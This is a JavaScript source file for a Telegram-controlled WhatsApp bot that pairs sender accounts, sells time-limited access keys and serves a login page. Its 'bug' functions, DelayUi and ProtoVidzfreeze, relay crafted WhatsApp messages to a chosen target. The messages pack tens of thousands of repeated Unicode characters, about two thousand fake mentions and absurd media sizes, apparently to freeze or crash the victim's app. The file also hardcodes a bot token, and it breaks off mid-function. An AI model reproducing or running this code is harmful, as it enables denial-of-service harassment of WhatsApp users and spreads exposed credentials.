// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8419616471:AAFPqUoJCRybQQW6on5K5oLll6oCjxpf4fc";
const OWNER_ID = "8311920532";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {}; // key: username_mode, value: timestamp
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000; // default 5 menit
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //
function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

// ==================== GLOBAL COOLING SYSTEM ==================== //
// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "REXZGTNG");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const teks = `( 🍁 ) ─── ❖ 情報 ❖  
𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 × 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺  
─── 革命的な自動化システム ───  
高速・柔軟性・絶対的な安全性を備えた 次世代ボットが今、覚醒する。

〢「 𝐗𝐈𝐒 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
 ࿇ Author : —!s' Rexz-Infinity 
 ࿇ Type : ( Case─Plugins )
 ࿇ League : Asia/Jakarta-
┌─────────
├──── ▢ ( 𖣂 ) Sender Handler
├── ▢ owner users
│── /addbot — <nomor>
│── /listsender —
│── /delsender — <nomor>
│── /add — <cards.json>
└────
┌─────────
├──── ▢ ( 𖣂 ) Key Manager
├── ▢ admin users
│── /ckey — <username,durasi>
│── /listkey —
│── /delkey — <username>
└────
┌─────────
├──── ▢ ( 𖣂 ) Access Controls
├── ▢ owner users
│── /addacces — <user/id>
│── /delacces — <user/id>
│── /addowner — <user/id>
│── /delowner — <user/id>
│── /setjeda — <1m/1d/1s>
└────`;
  ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ydj2rk.jpg" },
    {
      caption: teks,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "👤「所有者」", url: "https://t.me/Rexz_Infinity" },
          { text: "🕊「チャネル」", url: "t.me/" }
          ]
        ]
      }
    }
  );
});

// Sender management commands
bot.command("addbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addbot Number_\n_Example : /addbot 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delbot Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Helper untuk cari creds.json
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// ===== Command /add =====
bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

// Key management commands
bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args   = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] - ONLY ACCES USER\n—Please register first to access this feature."
    );
  }
  
  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ *Syntax Error!*\n\n_Use : /ckey User,Day_\n_Example : /ckey Rexz,30d",
      { parse_mode: "Markdown" }
    );
  }

  const [username, durasiStr] = args.split(",");
  const durationMs            = parseDuration(durasiStr.trim());
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h"
    );
  }

  const key     = generateKey(4);
  const expired = Date.now() + durationMs;
  const users   = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year    : "numeric",
    month   : "2-digit",
    day     : "2-digit",
    hour    : "2-digit",
    minute  : "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // Kirim detail ke user (DM)
  ctx.telegram.sendMessage(
    userId,
    `✅ *Key berhasil dibuat:*\n\n` +
    `🆔 *Username:* \`${username}\`\n` +
    `🔑 *Key:* \`${key}\`\n` +
    `⏳ *Expired:* _${expiredStr}_ WIB\n\n` +
    `*Note:*\n- Jangan di sebar\n- Jangan Di Freekan\n- Jangan Di Jual Lagi`,
    { parse_mode: "Markdown" }
  ).then(() => {
    // Setelah terkirim → kasih notifikasi di group
    ctx.reply("✅ Success Send Key");
  }).catch(err => {
    ctx.reply("❌ Gagal mengirim key ke user.");
    console.error("Error kirim key:", err);
  });
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey Rexz");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

// ================== COMMAND /SETJEDA ================== //
bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
╭╮╱╭┳━━━┳━━━┳╮╱╱╭━━━┳━━━┳━╮╱╭┳━━━╮
┃┃╱┃┃╭━╮┃╭━╮┃┃╱╱┃╭━╮┃╭━╮┃┃╰╮┃┃╭━╮┃
┃╰━╯┃┃╱┃┃╰━━┫┃╱╱┃┃╱┃┃┃╱┃┃╭╮╰╯┃┃╱┃┃
┃╭━╮┃┃╱┃┣━━╮┃┃╱╭┫┃╱┃┃┃╱┃┃┃╰╮┃┃┃╱┃┃
┃┃╱┃┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃┃╱┃┃┃╰━╯┃
╰╯╱╰┻━━━┻━━━┻━━━┻━━━┻━━━┻╯╱╰━┻━━━╯⠀⠀⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT XAVIERA-X 
├─ ID OWN : ${OWNER_ID}
├─ DEVELOPER : REXZ-INFINITY 
├─ MY SUPPORT : ALLAH 
├─ BOT : CONNECTED ✅
╰───────────────────`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

// ====== TEMPAT FUNCTION BUGS ====== //
async function DelayUi(target, mention = false) {
const msg = generateWAMessageFromContent(target, {
     videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/542007709_1419279083100126_4994906735915524095_n.enc?ccb=11-4&oh=01_Q5Aa3AF_cg18HSw3Kg7gs_7pb_zaakw2w4WThpMlvpgHaggKQw&oe=693B3CB3&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "5X6QG/AKIQ7g3b1n1qpsq5LM5bWjjIMverDg66FeZ0s=",
      fileLength: "1093475",
      seconds: 8,
      mediaKey: "0iCOFT9ApCSJe2vcjD37lz35/b/jh6koV70Wz2EHVyc=",
      caption: "Bombar Dilo Krokodilo" + "ꦽ".repeat(150) + "ꦾ".repeat(200),
      height: 1024,
      width: 576,
      fileEncSha256: "DTAda7Fm6qE2XtAiHRpZ4qnfem0RhDYlWCV8XjEC3L8=",
      directPath: "/v/t62.7161-24/542007709_1419279083100126_4994906735915524095_n.enc?ccb=11-4&oh=01_Q5Aa3AF_cg18HSw3Kg7gs_7pb_zaakw2w4WThpMlvpgHaggKQw&oe=693B3CB3&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1762866872",
       contextInfo: {
          statusAttributionType: 2,
          isForwarded: true, 
          forwardingScore: 7202508,
          forwardedAiBotMessageInfo: {
          botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            botName: "Nted Ai", 
            creatorName: "TeddyExecutiveV1St."
           }, 
            mentionedJid: [ 
               "0@s.whatsapp.net",
               ...Array.from({ length: 1900 }, () =>
               `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
               )
             ],
           },
          streamingSidecar: "PeyLKOdGMjZCgK0KAJZrhu5nKPTzh2sEimWe5gxIK6LEoq/MlxhVaJwL7ywy71BrsmF5uGxALZCIMrp7b9AF6XLlKzDE3Cj4AYMaG0ZEjvtdJaRe/Y5N3JM07xwrOwoN7VutQ1gfnV60/dZ7n+5gzAp4uLgwgmC0VakqBCh5dQG9qY3i25ZFuKdB5c315cP5/kctfhFB5FPhoMexWaO5O3rZ2CWTiojYhAE=",
          thumbnailDirectPath: "/v/t62.36147-24/55810755_801964922667124_8420420634930656113_n.enc?ccb=11-4&oh=01_Q5Aa3AED_xXtmBGPuCEZ88a_Tghl6teThDGelW7mWxhH0F7zxQ&oe=693B2F67&_nc_sid=5e03e0",
          thumbnailSha256: "lHu9b2whBMMyfgds+Nvs7ImAtgcEjJyEmoMTFxD0iBE=",
          thumbnailEncSha256: "xjTz0fcRWJdppljaUcGXkCRUBJpmt5Xfo3B0QHH/AMM="
         }
       }, {});
    
  await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
      statusJidList: [target],
       additionalNodes: [
         {
           tag: "meta",
            attrs: {},
             content: [
             {
              tag: "mentioned_users",
               attrs: {},
               content: [
               {
                tag: "to",
                attrs: { jid: target }, 
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
 
  if (mention) {
   let msg2 = generateWAMessageFromContent(target, proto.Message.fromObject({
     statusMentionMessage: {
      message: {
       protocolMessage: {
        key: msg.key,
        type: "STATUS_MENTION_MESSAGE",
         timestamp: Date.now() + 900,
         },
      },
   }
}), {})
  await sock.relayMessage(target, msg2.message, {
     participant: { jid:target }, 
      additionalNodes: [
       {
        tag: "meta",
        attrs: { is_status_mention: "true" },
        content: undefined,
      }
    ],
  });
}
}

async function ProtoVidzfreeze(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "</NtedExecuteV1St>" + "ꦽ".repeat(50000) +  "𑜦𑜠".repeat(18000) + "ꦾ".repeat(18000),
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 1999 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "589608164114571",
                                    songId: "870166291800508",
                                    author: ".NtedCrasher" + "ꦾ".repeat(18000),
                                    title: "{NtedExecuteV1St}",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/teddyboy_9073",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});

